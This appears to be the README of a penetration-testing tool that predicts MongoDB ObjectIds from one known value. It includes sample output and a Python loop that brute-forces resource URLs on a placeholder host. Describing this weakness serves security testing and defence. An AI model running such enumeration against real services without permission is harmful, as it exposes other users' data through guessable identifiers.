## Mongo ObjectId Introduction

[Mongo ObjectId](https://docs.mongodb.com/manual/reference/method/ObjectId/)s are generated
in a predictable manner, the 12-byte ObjectId value consists of:

 * a 4-byte value representing the seconds since the Unix epoch,
 * a 3-byte machine identifier,
 * a 2-byte process id, and
 * a 3-byte counter, starting with a random value.

Some web and REST APIs use these as resource IDs, and because developers believe they
are randomly generated or difficult to guess, they are also frequently used as (a very
weak) authorization layer: if you know the ObjectId then you have to be the right
user.

## Predicting Mongo ObjectIds

This tool will predict Mongo ObjectIds given a valid initial value.

```
./mongo-objectid-predict 5ae9b90a2c144b9def01ec37
...
5ae9bac82c144b9def01ec39
...
5ae9bacf2c144b9def01ec3a
...
5ae9bada2c144b9def01ec3b
```

Usually you'll use this tool together with Burp, or your own custom script in
order to brute-force a resource:

```python
import requests

from mongo_objectid_predict import predict

for objectid in predict('5ae9b90a2c144b9def01ec37'):
    response = requests.get('http://target.com/resource/%s' % objectid)
    process_response(response)
```
